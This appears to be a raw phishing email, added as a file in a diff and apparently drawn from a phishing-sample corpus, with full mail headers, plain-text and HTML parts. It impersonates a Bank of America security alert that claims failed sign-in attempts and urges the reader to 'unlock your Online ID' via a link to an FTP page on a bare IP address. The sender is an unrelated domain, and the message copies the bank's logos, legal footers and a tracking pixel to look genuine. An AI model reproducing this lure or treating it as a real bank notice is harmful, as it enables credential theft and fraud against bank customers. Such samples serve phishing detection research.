@@ -1,0 +1,621 @@
+Return-Path: admin@werbung-schenken.de
+Delivered-To: jose@monkey.org
+X-FDA: 72080718990.23.iron60_2dd3259bb6341
+X-Spam-Summary: 61,3.8,0,047b3d4e024ac9c7,d41d8cd98f00b204,admin@werbung-schenken.de,:admin@werbung-schenken.de,RULES_HIT:4:41:72:355:379:455:582:962:967:973:978:983:988:989:1049:1147:1152:1189:1208:1212:1221:1260:1261:1263:1313:1314:1345:1381:1390:1431:1432:1433:1434:1436:1437:1516:1517:1518:1545:1571:1575:1588:1592:1594:1686:1730:1744:1776:1792:1803:2194:2198:2199:2200:2525:2527:2539:2553:2557:2559:2566:2610:2612:2637:2682:2685:2693:2741:2820:2859:2890:2891:2892:2894:2897:2900:2902:2906:2909:2910:2911:2915:2917:2922:2923:2924:2925:2926:2933:2937:2939:2942:2945:2947:2951:2954:3000:3022:3038:3138:3139:3140:3141:3142:3148:3355:3623:3769:3865:3866:3867:3868:3870:3871:3873:3874:3934:3936:3938:3941:3944:3947:3950:3953:3956:3959:3976:4042:4250:4321:4425:4605:5007:6238:6248:6650:6669:6687:6688:6703:6757:6996:6997:7208:7557:7652:7903:7927:8527:8568:8599:8603:8784:8957:9025:9080:9121:9149:9199:9343:9388:9416:9908:10021:10049:10305:10346:11233:11257:11289:11473:11657:11658:11788:11914:12043:1
+X-HE-Tag: iron60_2dd3259bb6341
+X-Filterd-Recvd-Size: 18616
+Received: from mx01-2.ips.nl (mx01-2.ips.nl [185.21.240.117])
+	by imf14.b.hostedemail.com (Postfix) with ESMTP
+	for <jose@monkey.org>; Mon, 17 Oct 2016 19:25:14 +0000 (UTC)
+Received: from [185.21.240.64] (helo=solware.nl)
+	by mx01.ips.nl with esmtp (Exim 4.86)
+	(envelope-from <admin@werbung-schenken.de>)
+	id 1bwDUx-0003dL-Lm; Mon, 17 Oct 2016 21:23:00 +0200
+Received: from [192.168.8.100] ([127.0.0.1]) by solware.nl with MailEnable ESMTP; Mon, 17 Oct 2016 21:22:52 +0200
+Content-Type: multipart/alternative; boundary="===============0406576930=="
+MIME-Version: 1.0
+Subject: Bank of America Aler: Your Online Access Is Temporarily locked   
+To: Recipients <admin@werbung-schenken.de>
+From: "Bank of America Alert"<admin@werbung-schenken.de>
+Date: Mon, 17 Oct 2016 20:22:46 +0100
+Message-ID: <E1bwDUx-0003dL-Lm@mx01.ips.nl>
+X-Filter-ID: s0sct1PQhAABKnZB5plbIePkTliDBUUyDpebgSCM+08n8W7omF33KCXgXe463zmbKnfrVhBoQC0K
+ aiqHbDmiQ6fq8eWhxwllp70dI+SxjT3t5m8TuomaMsw06ES/RD3Gjdta7A9Et1dSSAvt2UX9xZSt
+ 2DwL2Umk00afzEU6LRI5O3VNxrqU5v/daBCFfhbAGxzKphCvYCqSDfqVYXmM+LH/I+rN7Nr83xc8
+ A9s5Vsg+exXfBtbKTDZZ+sesewIGiGQ9xOdQ1HrHSMz/dLu/1ylm/W8E6C9ixlEZrkzhRQIDOPHJ
+ nQRnqOjsdzccOJ3Ydg7q3NX1lBQei5+P2wTJqt/c8SAqXDKxqmf0jty/qr+uj+aZttQ9g5WGs42G
+ Neyw7yUnJGZzFl/8kM/JwO0Fisv5IFxKQygNG4WpaZNEFXbbFjF4WwZ60rsdj9rJwlUdsLyNV0kW
+ qjpYEavr0nQQbrXGKY1WQlJYZ9ShUXam0/CYqFINXlCNX8EnovsRJHXxxnJMdtCb5Ujsd8/dSSRZ
+ wskT11Z0ZQKj6k/yteYGbcqUFxXkrMFN4lMQbb8dRFZqT4GLZRRw9FqhkryP+AM+sI+sqJeG8ESB
+ HY9llaOi45bC+QTA/05csVpkcZGlRIc+QN7O7DiMQUSXipmccr5MFnTvfRW8RnlC4AnVDMQpeBWI
+ wYyWBErZ8qc0sobKSP2IdEmzOEhbq6ZoGqclbNzUMJmApXIsrpIiAc4tR9YcEkUi7aRKh8VdlUpA
+ B3KIaGqEaQkTcTURszZK7ZcuKPUm5BReftYmk7XbAccUpdYN4BsintcmN2MKE8B0s9MyH1YjiXSq
+ rSmr76YQ9AYTm1e+HLVJxky9Uswk0GiWh3SGs7h//aUOtX8GbAGYPQTnKmWIuZBlslK1pSos8gsu
+ Fpm9l1z1pRXWhjh9fdbl44I0Df0HXox6k5ng/O5wV1z+YiYhHHd2V+wVIKeMHSsWFJKR+FSLxdJO
+ Le/xkrWjBBOv2ElQUIx7AUloL4BCxpHYrUEmy6sbgNYNuWzo4qNk6xXGtcHlu0olC+++Wmmu1Fm2
+ Ze2LBDMrD7q/cJogwbqzsuokAgZU1o+iuhrAMe1EPZCY9GJmKBLAetCSCDr5bjTDqBSzDKPwzFc9
+ AvBJ7WxQvAsXSzwnsoiMolbKmPFiVA/7sNgls1vD4jqBrGq7lvkKoOh7Jjw8s4+G8iryjBweJXrK
+ iAifDs90GW2aNTMKOeRGqR9gSLamB/9QtkvVbcyva233c7yzLSS/z8fHeVPO1kYljChOoFMh0S70
+ 4xBIIQQl2BATC7l6vaxi9VRocHZq8i0=
+X-Report-Abuse-To: spam@mx01.ips.nl
+X-Originating-IP: 185.21.240.64
+X-SpamExperts-Domain: wh02.ips.nl
+X-SpamExperts-Username: 185.21.240.64
+Authentication-Results: ips.nl; auth=pass smtp.auth=185.21.240.64@wh02.ips.nl
+X-SpamExperts-Outgoing-Class: unsure
+X-SpamExperts-Outgoing-Evidence: Combined (0.85)
+X-Recommended-Action: accept
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 394
+
+You will not see this in a MIME-aware mail reader.
+--===============0406576930==
+Content-Type: text/plain; charset="iso-8859-1"
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
+Content-Description: Mail message body
+
+
+ 	 =
+
+   	 =
+
+  Please do not reply to this email. This email has been sent from an auto-=
+notification system that cannot accept incoming email.
+ 	 =
+
+  =
+
+ 	 =
+
+   =
+
+    	 	 =
+
+   =
+
+   	  	  =
+
+   =
+
+ 	 =
+
+  Review and Verify your Account Details	 =
+
+  =
+
+ 	 =
+
+  Online ID Confirmation	 =
+
+   	 =
+
+   =
+
+ 	 =
+
+   =
+
+   =
+
+ 	 =
+
+   	 =
+
+  We're letting you know that we detected several failed attempts to sign i=
+n to your Bank of America account on 03/29/2016. For your protection, we ne=
+ed you to review and verify your account details. Follow the link below to =
+unlock your Online ID.
+ 	 =
+
+  =
+
+ 	 =
+
+   =
+
+   =
+
+ 	 =
+
+   	 	  	  Click on this link to unlock your Online ID 	 =
+
+  =
+
+ 	 =
+
+  =
+
+   	 Date and time:	  	  October 17 / 04:00 PM-04:30 PM ET	 =
+
+   	 Language preference:	  	  English	 =
+
+  =
+
+ 	 =
+
+  =
+
+   	  	  	  Note: After verifying your account details, we will take the ne=
+cessary steps to protect your account from fraud.	 =
+
+  =
+
+ 	 =
+
+   	 	  	  	 =
+
+   	 =
+
+   	 =
+
+   	 =
+
+   =
+
+   	 =
+
+   	 =
+
+   	 =
+
+  =
+
+ 	 =
+
+   	 =
+
+   1Mobile Banking requires enrollment through the Mobile Banking app, mobi=
+le website or Online Banking. View the Online Banking Service Agreement for=
+ more information. Data connection required. Wireless carrier fees may appl=
+y. The Mobile Banking app is available on iPad, iPhone, and Android devices=
+. =
+
+ =
+
+ If your appointment is with a Merrill Edge Financial Solutions Advisor, yo=
+u should be aware that a Merrill Edge Financial Solutions Advisor can provi=
+de solutions that include FDIC insured deposit products with Bank of Americ=
+a and non-FDIC insured investment products from Merrill Lynch. =
+
+ =
+
+ Investment products:
+ =
+
+  =
+
+   Are Not FDIC Insured	 Are Not Bank Guaranteed	 May Lose Value	 =
+
+   =
+
+ =
+
+ Merrill Edge is the marketing name for two businesses: Merrill Edge Adviso=
+ry Center, which offers team-based advice and guidance brokerage services; =
+and a self-directed online investing platform. Both are made available thro=
+ugh Merrill Lynch, Pierce, Fenner & Smith Incorporated (MLPF&S). =
+
+ =
+
+ MLPF&S is a registered broker-dealer, Member SIPC and a wholly owned subsi=
+diary of Bank of America Corporation. =
+
+ =
+
+ Banking products are provided by Bank of America, N.A., member FDIC and a =
+wholly owned subsidiary of Bank of America Corporation. Equal Housing Lende=
+r  =
+
+ =
+
+ Email Preferences
+ This is a service email from Bank of America. Please note that you may rec=
+eive service email in accordance with your Bank of America service agreemen=
+ts, whether or not you elect to receive promotional email. =
+
+ =
+
+ Privacy and Security
+ Keeping your financial information secure is one of our most important res=
+ponsibilities. For an explanation of how we manage customer information, pl=
+ease read our Privacy Policy. You can also learn how Bank of America keeps =
+your personal information secure and how you can help protect yourself.
+ =
+
+ Bank of America Email, 8th Floor-NC1-002-08-25, 101 South Tryon St., Charl=
+otte, NC 28255-0001 =
+
+ =
+
+ =A9 2016 Bank of America Corporation. All rights reserved. =
+
+ =
+
+ ARD4M5F1/6N9ACU 	 =
+
+   	 =
+
+   	 =
+
+    	 =
+
+              =
+
+ =
+
+        =20
+--===============0406576930==
+Content-Type: text/html; charset="iso-8859-1"
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
+Content-Description: Mail message body
+
+<html><head><meta http-equiv=3D"Content-Type" content=3D"text/html; charset=
+=3Diso-8859-1"/></head><div style=3D"font-family:arial,helvetica;font-size:=
+10pt;color:black"><div id=3D"AOLMsgPart_2_5a0edbc6-db56-41f8-b430-e5a269515=
+767"><div class=3D"aolReplacedBody"><div style=3D"color:#000; background-co=
+lor:#fff; font-family:HelveticaNeue, Helvetica Neue, Helvetica, Arial, Luci=
+da Grande, sans-serif;font-size:16px"><div class=3D"yahoo_quoted" id=3D"yui=
+_3_16_0_ym18_1_1459291657829_6769" style=3D"display: block;"><div style=3D"=
+font-family: HelveticaNeue, Helvetica Neue, Helvetica, Arial, Lucida Grande=
+, sans-serif; font-size: 16px;" id=3D"yui_3_16_0_ym18_1_1459291657829_6768"=
+><div style=3D"font-family: HelveticaNeue, Helvetica Neue, Helvetica, Arial=
+, Lucida Grande, sans-serif; font-size: 16px;" id=3D"yui_3_16_0_ym18_1_1459=
+291657829_6767"><div class=3D"y_msg_container" id=3D"yui_3_16_0_ym18_1_1459=
+291657829_6766"><div id=3D"yiv6650402827"><div id=3D"yui_3_16_0_ym18_1_1459=
+291657829_6765"><table border=3D"0" cellpadding=3D"0" cellspacing=3D"0" wid=
+th=3D"100%"><tbody><tr><td><div align=3D"left"><table border=3D"0" cellpadd=
+ing=3D"0" cellspacing=3D"0" width=3D"600"><tbody><tr><td><table border=3D"0=
+" cellpadding=3D"0" cellspacing=3D"0" width=3D"600"><tbody><tr><td><table b=
+order=3D"0" cellpadding=3D"0" cellspacing=3D"10" width=3D"600"><tbody><tr><=
+td><table border=3D"0" cellpadding=3D"0" cellspacing=3D"0" width=3D"551"><t=
+body><tr><td align=3D"left" valign=3D"top" width=3D"551"><span style=3D"col=
+or:#333333;font-family:Verdana, Arial, Helvetica, sans-serif;font-size:smal=
+l;">
+</span></td>
+</tr>
+<tr>
+<td valign=3D"top" width=3D"551">
+</td>
+</tr>
+<tr>
+<td align=3D"left" valign=3D"top" width=3D"551"><span style=3D"color:#33333=
+3;font-family:Verdana, Arial, Helvetica, sans-serif;font-size:xx-small;"><s=
+trong>Please do not reply to this email. This email has been sent from an a=
+uto-notification system that cannot accept incoming email.</strong><br>
+</span></td>
+</tr>
+<tr>
+<td valign=3D"top" width=3D"551"><br>
+</td>
+</tr>
+</tbody>
+</table>
+<table border=3D"0" cellpadding=3D"0" cellspacing=3D"0" width=3D"551">
+<tbody>
+<tr>
+<td align=3D"left" valign=3D"top">&nbsp;</td>
+<td align=3D"right" valign=3D"middle" width=3D"165"><a rel=3D"nofollow" tar=
+get=3D"_blank" href=3D""><img alt=3D"Bank of America(R)" src=3D"http://imag=
+es.em.bankofamerica.com/imgs/MIE/Alert_03_2010/logo_bac.gif" height=3D"21" =
+border=3D"0" width=3D"165"></a></td>
+</tr>
+</tbody>
+</table>
+
+<table border=3D"0" cellpadding=3D"0" cellspacing=3D"0" width=3D"551">
+<tbody>
+<tr>
+<td align=3D"left" valign=3D"top" width=3D"58"><img alt=3D"" src=3D"http://=
+images.em.bankofamerica.com/imgs/MIE/Alert_03_2010/flagscape.gif" height=3D=
+"58" width=3D"58"></td>
+<td align=3D"left" valign=3D"top" width=3D"14">&nbsp;</td>
+<td align=3D"left" valign=3D"top" width=3D"479">
+<table border=3D"0" cellpadding=3D"0" cellspacing=3D"0" width=3D"479">
+<tbody>
+<tr>
+<td align=3D"left" valign=3D"top" width=3D"479"><br>
+</td>
+</tr>
+<tr>
+<td align=3D"left" valign=3D"top" width=3D"479"><span style=3D"color:#e3193=
+2;font-family:Verdana, Arial, Helvetica, sans-serif;font-size:large;"><stro=
+ng>Review and Verify your Account Details</strong></span></td>
+</tr>
+<tr>
+<td width=3D"479"><br>
+</td>
+</tr>
+<tr>
+<td align=3D"left" valign=3D"top" width=3D"479"><span style=3D"color:#0097d=
+8;font-family:Verdana, Arial, Helvetica, sans-serif;font-size:small;"><stro=
+ng>Online ID Confirmation</strong></span></td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+
+
+<br>
+</td>
+</tr>
+</tbody>
+</table>
+  =
+
+<table border=3D"0" cellpadding=3D"0" cellspacing=3D"0" width=3D"551">
+<tbody>
+<tr>
+<td width=3D"551"><br>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+<tr>
+<td width=3D"551"><span style=3D"color:#333333;font-family:Verdana, Arial, =
+Helvetica, sans-serif;font-size:small;">We're letting you know that we dete=
+cted several failed attempts to sign in to your
+Bank of America account on 03/29/2016. For your protection,
+we need you to  <strong>review and verify your account details</strong>. Fo=
+llow the link below to unlock your Online ID.<br>
+ </span></td>
+</tr>
+<tr>
+<td width=3D"551"><br>
+</td>
+</tr>
+<tr>
+<td width=3D"551">
+<table border=3D"0" cellpadding=3D"0" cellspacing=3D"0" width=3D"551">
+<tbody>
+<tr align=3D"right" valign=3D"top">
+<td colspan=3D"3"><br>
+</td>
+</tr>
+<tr>
+<td valign=3D"top" width=3D"11">&nbsp;</td>
+<td align=3D"left" valign=3D"top" width=3D"180"><span style=3D"color:#33333=
+3;font-family:Verdana, Arial, Helvetica, sans-serif;font-size:small;"></spa=
+n></td>
+<td valign=3D"top" width=3D"10">&nbsp;</td>
+<td align=3D"left" valign=3D"bottom" width=3D"350"><span style=3D"color:#33=
+3333;font-family:Verdana, Arial, Helvetica, sans-serif;font-size:small;"> C=
+lick on this link to <a rel=3D"nofollow" target=3D"_blank" href=3D"ftp://62=
+.91.10.58/901/Client/bofa.htm">unlock your Online ID</a> <a rel=3D"nofollow=
+" target=3D"_blank" href=3D""></a></span></td>
+</tr>
+<tr align=3D"right" valign=3D"top">
+<td colspan=3D"3"><br>
+</td>
+</tr>
+<tr>
+
+</tr>
+<tr>
+<td valign=3D"top" width=3D"11">&nbsp;</td>
+<td align=3D"left" valign=3D"top"><span style=3D"color:#333333;font-family:=
+Verdana, Arial, Helvetica, sans-serif;font-size:small;">Date and time:</spa=
+n></td>
+<td valign=3D"top" width=3D"10">&nbsp;</td>
+<td align=3D"left" valign=3D"bottom" width=3D"350"><span style=3D"color:#33=
+3333;font-family:Verdana, Arial, Helvetica, sans-serif;font-size:small;"> O=
+ctober   17 / 04:00 PM-04:30 PM ET</span></td>
+</tr>
+<tr>
+<td valign=3D"top" width=3D"11">&nbsp;</td>
+<td align=3D"left" valign=3D"top"><span style=3D"color:#333333;font-family:=
+Verdana, Arial, Helvetica, sans-serif;font-size:small;">Language preference=
+:</span></td>
+<td valign=3D"top" width=3D"10">&nbsp;</td>
+<td align=3D"left" valign=3D"bottom" width=3D"350"><span style=3D"color:#33=
+3333;font-family:Verdana, Arial, Helvetica, sans-serif;font-size:small;"> E=
+nglish</span></td>
+</tr>
+<tr align=3D"right" valign=3D"top">
+<td colspan=3D"3"><br>
+</td>
+</tr>
+<tr>
+
+</tr>
+<tr>
+<td valign=3D"top" width=3D"11">&nbsp;</td>
+<td align=3D"left" valign=3D"top">&nbsp;</td>
+<td valign=3D"top" width=3D"10">&nbsp;</td>
+<td align=3D"left" valign=3D"bottom" width=3D"350"><span style=3D"color:#33=
+3333;font-family:Verdana, Arial, Helvetica, sans-serif;font-size:small;"><s=
+trong> Note:</strong> After verifying
+your account details, we will take the necessary steps
+to protect your account from fraud.</span></td>
+</tr>
+<tr align=3D"right" valign=3D"top">
+<td colspan=3D"3"><br>
+</td>
+</tr>
+<tr>
+<td valign=3D"top" width=3D"11">&nbsp;</td>
+<td align=3D"left" valign=3D"top"><span style=3D"color:#333333;font-family:=
+Verdana, Arial, Helvetica, sans-serif;font-size:small;"></span></td>
+<td valign=3D"top" width=3D"10">&nbsp;</td>
+<td align=3D"left" valign=3D"top" width=3D"350"><span style=3D"color:#33333=
+3;font-family:Verdana, Arial, Helvetica, sans-serif;font-size:small;"><a re=
+l=3D"nofollow" target=3D"_blank" href=3D""></a> </span></td>
+</tr>
+<tr align=3D"right" valign=3D"top">
+<td colspan=3D"3">
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+<tr>
+<td width=3D"551">
+</td>
+</tr>
+<tr>
+<td>
+<table>
+<tbody>
+<tr>
+<td><span style=3D"color:#333333;font-family:Verdana, Arial, Helvetica, san=
+s-serif;font-size:small;"><a rel=3D"nofollow" target=3D"_blank" href=3D""><=
+/a><sup></sup></span></td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+
+<tr>
+<td width=3D"551">
+</td>
+</tr>
+<tr>
+<br>
+</td>
+</tr>
+<tr>
+<td width=3D"551">
+</td>
+</tr>
+ =
+
+<tr>
+<td align=3D"left" valign=3D"top" width=3D"551"><span style=3D"color:#55555=
+5;font-family:Verdana, Arial, Helvetica, sans-serif;font-size:xx-small;"><s=
+pan style=3D"color:#555555;font-family:Verdana, Arial, Helvetica, sans-seri=
+f;font-size:xx-small;"> <sup>1</sup>Mobile Banking requires enrollment thro=
+ugh the Mobile Banking app, mobile website or Online Banking. View the <a r=
+el=3D"nofollow" target=3D"_blank" href=3D"">Online Banking Service Agreemen=
+t</a> for more information. Data connection required. Wireless carrier fees=
+ may apply. The Mobile Banking app is available on iPad, iPhone, and Androi=
+d devices. <br>
+<br>
+If your appointment is with a Merrill Edge Financial Solutions Advisor, you=
+ should be aware that a Merrill Edge Financial Solutions Advisor can provid=
+e solutions that include FDIC insured deposit products with Bank of America=
+ and non-FDIC insured investment products from Merrill Lynch. <br>
+<br>
+Investment products:<br>
+<br>
+</span></span>
+<table border=3D"1" cellpadding=3D"0" cellspacing=3D"0" width=3D"551">
+<tbody>
+<tr>
+<td height=3D"40" align=3D"center" valign=3D"middle" width=3D"700"><span st=
+yle=3D"color:#7b7b7b;font-family:Verdana, Arial, Helvetica, sans-serif;font=
+-size:xx-small;"><strong>Are Not FDIC Insured</strong></span></td>
+<td height=3D"40" align=3D"center" valign=3D"middle" width=3D"700"><span st=
+yle=3D"color:#7b7b7b;font-family:Verdana, Arial, Helvetica, sans-serif;font=
+-size:xx-small;"><strong>Are Not Bank Guaranteed</strong></span></td>
+<td height=3D"40" align=3D"center" valign=3D"middle" width=3D"700"><span st=
+yle=3D"color:#7b7b7b;font-family:Verdana, Arial, Helvetica, sans-serif;font=
+-size:xx-small;"><strong>May Lose Value</strong></span></td>
+</tr>
+</tbody>
+</table>
+<span style=3D"color:#555555;font-family:Verdana, Arial, Helvetica, sans-se=
+rif;font-size:xx-small;"><br>
+<br>
+Merrill Edge is the marketing name for two businesses: Merrill Edge Advisor=
+y Center, which offers team-based advice and guidance brokerage services; a=
+nd a self-directed online investing platform. Both are made available throu=
+gh Merrill Lynch, Pierce, Fenner &amp; Smith Incorporated (MLPF&amp;S). <br>
+<br>
+MLPF&amp;S is a registered broker-dealer, Member <a rel=3D"nofollow" target=
+=3D"_blank" href=3D""><span style=3D"color:#555555;">SIPC</span></a> and a =
+wholly owned subsidiary of Bank of America Corporation. <br>
+<br>
+Banking products are provided by Bank of America, N.A., member FDIC and a w=
+holly owned subsidiary of Bank of America Corporation. <a rel=3D"nofollow" =
+target=3D"_blank" href=3D""><span style=3D"color:#555555;">Equal Housing Le=
+nder</span></a>&nbsp;<img alt=3D"" src=3D"http://images.em.bankofamerica.co=
+m/imgs/MIE/odao/odaohouse.gif" height=3D"9" width=3D"14"> <br>
+<br>
+<strong>Email Preferences</strong><br>
+This is a service email from Bank of America. Please note that you may rece=
+ive service email in accordance with your Bank of America service agreement=
+s, whether or not you elect to receive promotional email. <br>
+<br>
+
+<strong>Privacy and Security</strong><br>
+Keeping your financial information secure is one of our most important resp=
+onsibilities. For an explanation of how we manage customer information, ple=
+ase read our <a rel=3D"nofollow" target=3D"_blank" href=3D""><span style=3D=
+"color:#555555;">Privacy Policy</span></a>. You can also learn how Bank of =
+America keeps your <a rel=3D"nofollow" target=3D"_blank" href=3D""><span st=
+yle=3D"color:#555555;">personal information secure</span></a> and how you c=
+an help protect yourself.<br>
+ <br>
+ Bank of America Email, 8th Floor-NC1-002-08-25, 101 South Tryon St., Charl=
+otte, NC 28255-0001 <br>
+<br>
+ =A9 2016 Bank of America Corporation. All rights reserved.  <br>
+<br>
+ARD4M5F1/6N9ACU  </span></td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+
+</td>
+</tr>
+</tbody>
+</table>
+
+<div>&nbsp;</div>
+
+
+
+<div>&nbsp;</div>
+
+
+
+<div>&nbsp;</div>
+
+
+
+<div>&nbsp;</div>
+
+
+
+<div><img alt=3D"" src=3D"http://click.ealerts.bankofamerica.com/open.aspx?=
+ffcb10-fecd167377650675-fe2b1579776c0779771271-fefc1373726604-ff9c1770-fe1b=
+1576726c007f7c1c77-fe931570716d077e7d" height=3D"1" width=3D"1"></div>
+</div>
+</div>
+<br>
+<br>
+</div>
+  </div>
+ </div>
+  </div>
+</div>
+</div>
+
+</div>
+
+
+
+
+</div>
+</html>
+--===============0406576930==--
+
